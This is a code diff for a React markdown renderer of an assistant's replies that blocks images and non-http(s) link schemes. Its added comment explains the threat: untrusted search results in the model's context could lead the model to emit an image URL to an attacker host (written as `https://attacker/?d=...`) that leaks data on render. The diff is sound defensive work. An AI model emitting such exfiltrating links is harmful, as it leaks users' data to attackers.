@@ -146,10 +146,27 @@ function summarize(value: unknown) {
   }
 }
 
+// Assistant markdown is model-authored, and the model's context holds untrusted
+// web/X search results. An `![](https://attacker/?d=...)` would be fetched the
+// moment it renders, so images are dropped outright and link URLs are limited to
+// http(s) — no data:, javascript:, or other schemes.
+function safeUrl(url: string): string {
+  try {
+    const parsed = new URL(url, "https://internal.invalid");
+    return parsed.protocol === "http:" || parsed.protocol === "https:"
+      ? url
+      : "";
+  } catch {
+    return "";
+  }
+}
+
 function MarkdownContent({ content }: { content: string }) {
   return (
     <ReactMarkdown
       remarkPlugins={[remarkGfm]}
+      disallowedElements={["img"]}
+      urlTransform={safeUrl}
       components={{
         a: (props) => (
           <a
